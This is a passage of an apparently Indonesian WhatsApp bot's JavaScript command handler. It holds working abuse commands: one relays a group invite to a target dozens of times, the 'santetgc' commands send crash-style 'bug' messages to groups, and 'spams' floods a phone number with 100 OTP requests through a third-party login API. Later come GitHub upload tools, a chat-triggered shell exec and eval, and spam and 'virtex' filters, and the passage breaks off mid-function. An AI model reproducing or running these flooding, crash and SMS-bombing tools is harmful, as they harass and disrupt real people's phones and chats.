Fj62xON1dAz96ViGVmgqX0oYDognSFk7/APmPngRzCgLZUimblBjYb4Jb6acPCJWlxXIVLxtBkeu1scUhaqdwS8SVTEW6eWHGavpdDAYS01AJMdflhny1Bpai+2NKoIBJnbF7T2j81pPIjlSEm4TBFvW+HVExU1VWUsMhwuEIbBTIcPgPPDZThIaC+b7tu6PDpjQfs74syzKaGsoahNQzUVDk9tYZbLrQKEDYg2BBPXc2w6KrOa5Dm2Wdm7bl5Zp6l2W0huCuDe2/huB0xqVNwI0M4oEU/Mp101OlyrU2ASXCYGgxa6F7z0thj930+bcY5Q8znzlewtwuFspOtrlwuCCZAXEdPTF44XzamzKqz1SOYh1NYUAEboCAkHfYlCyPXCL/ABU6vh/gescqaZt4M1awuXQ5AFiTEjR4m3QHDDLeDcpe4MzHMQ2+4UJqCy9tqDYIkgjxBMdJxmVcxUtZ1ySagOBzQoBsSI+PT9sbNm5NF9kc0pnmttkSBdK3AT9CcLIjON/FR+zPhXJ86r6mpcoXTSUwu25UGSokaD3YsNC7efliW4n4fyPI+JKLMjQoOWVJCFJ1DlgxBtH5O+IO6TiU+yihqaTgevfpEtmtqtQZLgAAIR3L9O+TifZ4def4POT5iWeY2mGHG++EAXRMxttHgPPDmHMjP/tI4HZTXZO1kzRDDzhaFMp1Swhe9iZIBF42GknxwPjngvh7hvJmlc4u5guPZSnQYjWv3ZA+PUeeNJ4drVM8It1eYsLDlA24hwKSFueykG83MCJ8ZxRuHs8zPiWvzF/7oo8wp3XQ243UtgIaQJgSTYXNwCesYDZE6GS42EKo7dUz/GOqSyaZ2FU2vVYC07dcaJ9p2X8PUiKdeVvAV4Oh2mZVzUN2PU3mY36dMZ4VKNM/CnjDk/hCNxvgHbhU7DXd/wBsfib263tjlN3qp8EALG0Kv8+uI8MtqTYmD6YKwy2gruNv90YexWxo/wBneeU2RO5g8+HF1a2S3TlQCxqN4N7CUDbzwHgziityDNFv8pyopnTodSo2WBMHyI/cjralMqabS4F6DqUNiAdwcP15sSXDpaC5CwoBHdIsI+HrhbB02Ku4r4UKu2nLg5WqIWJpWyvmdCbxIgX8seybi/hx7I6TK32Xi1SsNtnmtIPuIgGyj4Yx13Mg9oaLNOA0lxHupvr3JP8A7kjwwmmzYMgKQwyi0RCPn6i/z9MGxLU6ri+joeGF5fkzFY3UrJWFcrQgFbnMWAuZ6kD4Yq+S8dcQ5fXO1Dz7tUgAgtPqLgg/H0OKs3XNtPU8Ms2d5l1Aj4g2Px+gwVGcBoVHsKUh0EkAJ7np4H9sLS1olfx5TvcIVNEKaoTX1RUdSWQG4W5rX1kWJ8cZoxWV1JllTTslxuneVodB2UJ2I2O/1wb72S2kamKZxZ0XIRM/xN/jgNbWtVLHLLVOJT7wIPWfXqf+RBolNalS1PNFbiyYtrVPT6YUXOWy+rUUS5Ez5jzviOdZISP7fxsoTjymwG55bJJ/7ttsPpeT2fqU2AxCnbC0teXS18DZda7TUD2gEe8GgfmMENPBY0FZkfmjp9MERS0/MdLbzxcgSAqDM/XBbCtkArHWpQQokF0bMRgvNTpN3LXg082jHqto60IQagjmW1wd/D5YMQ4lCP7jupgaVCMBGKmwqrQZdnV+nB69IwbRFRUEVCx3Ru0Z9w9Iwl5xSa5q65W5BuJ+fzwRDbwqKghTq3NIBMjwO/ywbT2hoD3MaLbzjg8Q0T09McU4S3UFx51ZiPwYHxtg9NVPNOtlCyJVfvX6Y9zVhD+h1aCN/aDY74JommFWpPLprOR6bWG1r4LT8ssrC1LbBcJu2fLwH0x6sqFt8jlkweuoeA6dMKRVu8l3WHCOZ+oPLfxOH2fYi+QXWhzptuGiD/jHlNNFh+axYHM/RJBuOsWw1qFKdcaLiXNZTfU4P5tji57M7PNnVeXB4jpgwfX+v//Z",
                "caption": `${command}\n*https://wa.me/settings*\n${botname} ${(prefix)}`,
              }
            }), {
              userJid: Pe,
              quoted: fakeQuoted
            })
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(2000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(10000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
            await sleep(12000)
            sock.relayMessage(Pe, groupInvite.message, {
              messageId: groupInvite.key.id
            })
          } catch (err) {
            reply('Terjadi kesalahan: ' + err)
          }
        }
        break
        case 'santetgc': {
          if (!isOwner) return reply(mess.owner)
          let good = text.split(',');
          if (good.length < 2) return reply(`*Masukan Input Dengan Benar!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 129xxx@g.us,5\n\n`)
          if (!good[0]) return reply(`*Masukan ID Grup!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 172xxx@g.us,5\n\n`)
          if (!good[1]) return reply(`*Masukan Jumlah Yang Dikirim!*\n\n*Cara :*\n${prefix + command} id,jumlah\n\n*Contoh :*\n${prefix + command} 172xxx@g.us,5\n\n`)
          try {
            reply(`*[ </> ]* Mengirimkan ${command}...`)
            await sleep(1000)
            gcbug(good[0], good[1])
            await sleep(2000)
            reply(`*[ </> ]* Done sent!`)
          } catch (err) {
            reply('Terjadi kesalahan: ' + err)
          }
        }
        break
        case 'santetgc2': {
          if (!text) return reply('Masukan ID Grup\n\n*Contoh:*\n.santetgc2 1775885477557@g.us')
          if (!q.includes("@")) return reply('Masukan ID Grup\n\n*Contoh:*\n.santetgc2 1775885477557@g.ust')
          async function buggi(judul, teks, buttontext, buttonid, target) {
            let msg = generateWAMessageFromContent(target, {
              viewOnceMessage: {
                message: {
                  "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                  },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                      text: teks
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                      text: name
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                      title: judul,
                      subtitle: "Rerezz Official",
                      hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        "name": "quick_reply",
                        "buttonParamsJson": `{\"display_text\":${buttontext},\"id\":${buttonid}}`
                      }],
                    })
                  })
                }
              }
            }, {})

            await sock.relayMessage(msg.key.remoteJid, msg.message, {
              messageId: msg.key.id
            })
          }
          try {
            buggi("Assalamualaikum", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
            await sleep(2000)
            buggi("Kenalin Member Baru", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
            await sleep(4000)
            buggi("Kok Sepi", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
            await sleep(6000)
            buggi("Pada Kemana", `Gak jawab dosa`, "Waalaikum salam", "salam", text)
          } catch (err) {
            reply('Terjadi kesalahan: ' + err)
          }
        }
        break
        case 'spams': {
          if (!isOwner) return reply(mess.owner)
          const pushname = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          try {
            if (m.quoted || text) {
              if (pushname.startsWith('08')) return reply('Awali nomor dengan +62')
              if (pushname.startsWith('+447539162479')) return reply('Tidak bisa spam ke nomor ini!')
              let nosms = '+' + pushname.replace('@s.whatsapp.net', '')
              let mal = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36"]
              let ua = mal[Math.floor(Math.random() * mal.length)];
              let axios = require('axios').default;
              let hd = {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
              };
              const dat = {
                'phone': nosms
              };
              for (let x = 0; x < 100; x++) {
                axios.post('https://api.myfave.com/api/fave/v1/auth', dat, {
                  headers: hd
                }).then(res => {
                  console.log(res);
                }).catch(err => {
                  console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS)`);
                });
              }
            } else reply(`Penggunaan spamsms nomor/reply pesan target*\nContoh spamsms +628xxxx`)
            reply(`spam sms/call akan di kirim ke no target`)
          } catch (err) {
            reply('Terjadi kesalahan: ' + err)
          }
        }
        break
        
        
       

        /* GITHUB MANAGEMENT */
        function fileToBase64(filePath) {
  return fs.readFileSync(filePath, { encoding: "base64" })
}
function toBase64(file) {
  return fs.readFileSync(file, "base64")
}

async function uploadToGithub(repo, filePath, content) {
  let url = `https://api.github.com/repos/${repo}/contents/${filePath}`
  await axios.put(url, {
    message: `upload ${filePath}`,
    content
  }, {
    headers: {
      Authorization: `token ${global.github.token}`,
      "User-Agent": "WhatsApp-Bot"
    }
  })
}

// Case
case "upghextra": {
  if (!m.quoted) return reply("Reply file ZIP!")
  if (!/zip/.test(m.quoted.mimetype)) return reply("File harus ZIP")

  let repo = args[0]
  let targetDir = args[1] || ""

  if (!repo) return reply("Format:\n.upghextra owner/repo folder")

  let buffer = await m.quoted.download()
  let zipPath = `./tmp_${Date.now()}.zip`
  let extractPath = `./extract_${Date.now()}`

  fs.writeFileSync(zipPath, buffer)

  let zip = new AdmZip(zipPath)
  zip.extractAllTo(extractPath, true)

  async function walk(dir) {
    let files = fs.readdirSync(dir)
    for (let file of files) {
      let fullPath = path.join(dir, file)
      let stat = fs.statSync(fullPath)

      if (stat.isDirectory()) {
        await walk(fullPath)
      } else {
        let relative = path.relative(extractPath, fullPath)
        let repoPath = path.join(targetDir, relative).replace(/\\/g, "/")
        let content = toBase64(fullPath)

        await uploadToGithub(repo, repoPath, content)
      }
    }
  }

  await walk(extractPath)

  fs.rmSync(zipPath, { force: true })
  fs.rmSync(extractPath, { recursive: true, force: true })

  reply(`âœ… ZIP berhasil diekstrak & diupload ke GitHub\nğŸ“¦ Repo: ${repo}`)
}
break
case "tourlgh":
case "tourlgithub":
case "urlgh": 
case "tourl3": {
    try {
        // Cek apakah ada media yang dikutip atau dikirim
        let media, filename, mime;

        // Support semua tipe media
        const supportedMedia = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage', 'stickerMessage'];
        
        if (quoted && supportedMedia.includes(quoted.mtype)) {
            media = await quoted.download();
            filename = quoted.filename || `file_${Date.now()}`;
            mime = quoted.mimetype || 'application/octet-stream';
            
            // Handle sticker (konversi ke image)
            if (quoted.mtype === 'stickerMessage') {
                mime = 'image/webp';
                if (!filename.includes('.webp')) {
                    filename = `sticker_${Date.now()}.webp`;
                }
            }
        } else if (supportedMedia.includes(m.type)) {
            media = await m.download();
            filename = m.filename || `file_${Date.now()}`;
            mime = m.mimetype || 'application/octet-stream';
            
            // Handle sticker (konversi ke image)
            if (m.type === 'stickerMessage') {
                mime = 'image/webp';
                if (!filename.includes('.webp')) {
                    filename = `sticker_${Date.now()}.webp`;
                }
            }
        } else {
            return await reply(`âŒ *Format tidak didukung!*\n\nSilakan kirim atau reply salah satu media berikut:\nğŸ“· Gambar\nğŸ¬ Video\nğŸµ Audio\nğŸ“„ Dokumen\nâœ¨ Sticker\n\n*Contoh:* .upgh (dengan media yang di-reply)`);
        }

        await reply("â³ *Mengupload media ke GitHub...*");

        // Panggil fungsi uploader
        const result = await GitHubUploader(media, filename, mime);
        
        if (result.success) {
            await reply(result.message);
        } else {
            await reply(`âŒ *Upload Gagal!*\n\n${result.error}`);
        }

    } catch (error) {
        console.error("Error in upgh handler:", error);
        await reply(`âŒ *Terjadi kesalahan!*\n\n${error.message}`);
    }
}
break;
case "uploadgh":
case "upgh":
case "uploadgithub":
case "upgithub": {
if (!isOwner) return reply(mess.owner)
  if (!m.quoted) return reply("Reply file/media!")

  let [repo, repoPath, filename] = args
  if (!repo || !repoPath || !filename)
    return reply(".upgithub owner/repo folder filename")

  let media = await m.quoted.download()
  let tmp = `./tmp_${Date.now()}`
  fs.writeFileSync(tmp, media)

  let content = fileToBase64(tmp)

  let url = `https://api.github.com/repos/${repo}/contents/${repoPath}/${filename}`

  await axios.put(url, {
    message: `upload ${filename}`,
    content
  }, {
    auth: {
      username: global.github.username,
      password: global.github.token
    }
  })

  fs.unlinkSync(tmp)
  reply("âœ… Berhasil upload ke GitHub")
}
break
case "cgist":
case "creategist":
case "gist": {
if (!isOwner) return reply(mess.owner)
  let text = args.join(" ").split("|")
  if (!text[0] || !text[1])
    return reply(".gist filename | isi")

  let filename = text[0].trim()
  let content = text[1].trim()

  let res = await axios.post("https://api.github.com/gists", {
    description: "Upload via WhatsApp Bot",
    public: true,
    files: {
      [filename]: {
        content
      }
    }
  }, {
    headers: {
      Authorization: `token ${global.github.token}`
    }
  })

  reply(`âœ… Gist dibuat\n${res.data.html_url}`)
}
break
case "listrepository":
case "listrepo": {
if (!isOwner) return reply(mess.owner)
  let res = await axios.get("https://api.github.com/user/repos", {
    headers: {
      Authorization: `token ${global.github.token}`
    }
  })

  let teks = "ğŸ“¦ Repository GitHub:\n\n"
  res.data.forEach(r => {
    teks += `â€¢ ${r.name} (${r.private ? "Private" : "Public"})\n`
  })

  reply(teks)
}
break
case "crepo":
case "createrepository":
case "createrepo": {
if (!isOwner) return reply(mess.owner)
  let text = args.join(" ").split("|")
  let name = text[0]?.trim()
  let type = text[1]?.trim() || "public"

  if (!name) return reply(".createrepo nama | public/private")

  let res = await axios.post("https://api.github.com/user/repos", {
    name,
    private: type === "private"
  }, {
    headers: {
      Authorization: `token ${global.github.token}`
    }
  })

  reply(`âœ… Repo dibuat\n${res.data.html_url}`)
}
break
case "deleterepo":
case "deleterepository":
case "delrepo": {
if (!isOwner) return reply(mess.owner)
  let repo = args[0]
  if (!repo) return reply("Format:\n.delrepo owner/repo")

  try {
    await axios.delete(`https://api.github.com/repos/${repo}`, {
      auth: {
        username: global.github.username,
        password: global.github.token
      },
      headers: {
        "User-Agent": "WhatsApp-Bot"
      }
    })

    reply(`ğŸ—‘ï¸ Repo *${repo}* berhasil dihapus`)
  } catch (err) {
    if (err.response) {
      reply(`âŒ Gagal hapus repo\n${err.response.data.message}`)
    } else {
      reply("âŒ Error saat menghapus repo")
    }
  }
}
break
case "listfile": {
  let repo = args[0]
  let repoPath = args[1] || ""

  if (!repo) return reply("Format:\n.listfile owner/repo [path]")

  try {
    let url = `https://api.github.com/repos/${repo}/contents/${repoPath}`

    let res = await axios.get(url, {
      headers: {
        Authorization: `token ${global.github.token}`,
        "User-Agent": "WhatsApp-Bot"
      }
    })

    if (!Array.isArray(res.data))
      return reply("Path bukan folder")

    let teks = `ğŸ“‚ Isi Repo *${repo}*\n`
    teks += repoPath ? `ğŸ“ Path: /${repoPath}\n\n` : "\n"

    res.data.forEach(v => {
      if (v.type === "dir") {
        teks += `ğŸ“ ${v.name}\n`
      } else {
        teks += `ğŸ“„ ${v.name} (${(v.size / 1024).toFixed(1)} KB)\n`
      }
    })

    reply(teks)
  } catch (err) {
    if (err.response) {
      reply(`âŒ ${err.response.data.message}`)
    } else {
      reply("âŒ Gagal mengambil file repo")
    }
  }
}
break


               default:
                if (budy.startsWith('$')) {
                    if (!isOwner) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                if (budy.startsWith('>')) {
                    if (!isOwner) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await reply(evaled);
                    } catch (err) {
                        reply(String(err));
                    }
                }
                //
// =====================
// ğŸš« ANTI BADWORD
// =====================
let chat = db.chats[m.chat]
if (!chat) db.chats[m.chat] = { badwords: [] }
if (!chat.badwords) chat.badwords = []

if (chat.antibadword && m.text) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  let text = m.text.toLowerCase()
  let badword = chat.badwords.find(w => text.includes(w))
  if (!badword) return

  // DELETE MESSAGE
  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.sender
    }
  })

  // WARNING
  await addWarning(
    sock,
    m,
    `Menggunakan kata terlarang: *${badword}*`,
    pushname
  )
}
////////////
// =====================
// ğŸ¤– AUTO REACT MESSAGE
// =====================                
if (!chat.reactEmoji) chat.reactEmoji = ["ğŸ˜‚","ğŸ”¥","ğŸ˜","ğŸ‘","â¤ï¸"]

if (m.isGroup && chat.autoreact && !m.fromMe) {
  try {
    let emoji =
      chat.reactEmoji[Math.floor(Math.random() * chat.reactEmoji.length)]

    await sock.sendMessage(m.chat, {
      react: {
        text: emoji,
        key: m.key
      }
    })
  } catch (e) {
    console.log("AutoReact Error:", e)
  }
}
// =====================
// ğŸš« ANTI PROMOSI
// =====================
if (chat.antipromosi && m.text) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  let text = m.text.toLowerCase()

  // POLA PROMOSI
  let promoRegex = /(wa\.me\/|chat\.whatsapp\.com\/|t\.me\/|telegram\.me\/|discord\.gg\/|instagram\.com\/|facebook\.com\/|youtube\.com\/|subrek|subscribe|join grup|open member|open jasa|paid promote|jual|harga|murah)/i

  if (!promoRegex.test(text)) return

  // DELETE MESSAGE
  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.sender
    }
  })

  // WARNING
  await addWarning(
    sock,
    m,
    "Mengirim promosi / iklan",
    pushname
  )
}
// =====================
// ğŸš« ANTI VIRTEX / BUG
// =====================
if (chat.antivirtex && m.text) {
  if (!isBotAdmins) return
  if (isAdmins || isOwner) return

  let text = m.text

  // DETEKSI VIRTEX
  let isVirtex =
    text.length > 4000 || // teks kepanjangan
    /[\u{1F000}-\u{1FFFF}]/u.test(text) && text.length > 1500 || // emoji spam
    /(.)\1{20,}/.test(text) || // huruf diulang gila-gilaan
    /[\u200B-\u200F\u202A-\u202E]/.test(text) // unicode invisible / RTL bug

  if (!isVirtex) return

  // DELETE MESSAGE
  await sock.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.sender
    }
  })

  // WARNING
  await addWarning(
    sock,
    m,
    "Mengirim Virtex / Bug WhatsApp",
    pushname
  )
}
////////////
const platform = [
    "tiktok.com",
    "instagram.com",
    "fb.com",
    "facebook.com",
    "youtube.com",
    "youtu.be",
    "telegram.me",
    "t.me",
    "discord.gg",
    "twitter.com",
    "x.com"
];

// AUTO DOWNLOAD LINK
if (db.chats[m.chat].autodl) {
    if (platform.some(link => budy.toLowerCase().includes(link))) {
        try {

            async function fetchInitialPage(initialUrl) {
                try {
                    const axios = require('axios')
                    const cheerio = require('cheerio')

                    const headers = {
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
                        'Referer': initialUrl,
                    }

                    const response = await axios.get(initialUrl, { headers })
                    const $ = cheerio.load(response.data)

                    const csrfToken = $('meta[name="csrf-token"]').attr('content')
                    if (!csrfToken) throw new Error('Gagal nemu token keamanan, coba lagi!')

                    let cookies = ''
                    if (response.headers['set-cookie']) {
                        cookies = response.headers['set-cookie'].join('; ')
                    }

                    return { csrfToken, cookies }

                } catch (err) {
                    throw new Error(`Gagal ambil halaman awal: ${err.message}`)
                }
            }


            async function postDownloadRequest(downloadUrl, userUrl, csrfToken, cookies) {
                try {
                    const axios = require('axios')

                    const headers = {
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; RMX2185 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
                        'Referer': 'https://on4t.com/online-video-downloader',
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest',
                        'Cookie': cookies
                    }

                    const postData = new URLSearchParams()
                    postData.append('_token', csrfToken)
                    postData.append('link[]', userUrl)

                    const response = await axios.post(downloadUrl, postData.toString(), { headers })

                    if (response.data?.result?.length) {
                        return response.data.result.map(item => ({
                            title: item.title,
